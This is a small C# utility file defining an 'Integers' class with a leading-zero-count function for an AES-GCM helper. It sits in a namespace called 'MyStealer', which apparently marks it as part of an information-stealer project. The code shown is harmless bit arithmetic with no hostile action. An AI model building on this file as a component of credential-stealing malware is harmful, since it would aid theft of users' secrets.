namespace MyStealer.Utils.BcAesGcm
{
    public static class Integers
    {
        public const int NumBits = 32;
        public const int NumBytes = 4;

        public static int NumberOfLeadingZeros(int i)
        {
#if NETCOREAPP3_0_OR_GREATER
            return BitOperations.LeadingZeroCount((uint)i);
#else
            if (i <= 0)
                return ~i >> 31 - 5 & 1 << 5;

            var u = (uint)i;
            var n = 1;
            if (0 == u >> 16)
            { n += 16; u <<= 16; }
            if (0 == u >> 24)
            { n += 8; u <<= 8; }
            if (0 == u >> 28)
            { n += 4; u <<= 4; }
            if (0 == u >> 30)
            { n += 2; u <<= 2; }
            n -= (int)(u >> 31);
            return n;
#endif
        }
    }
}
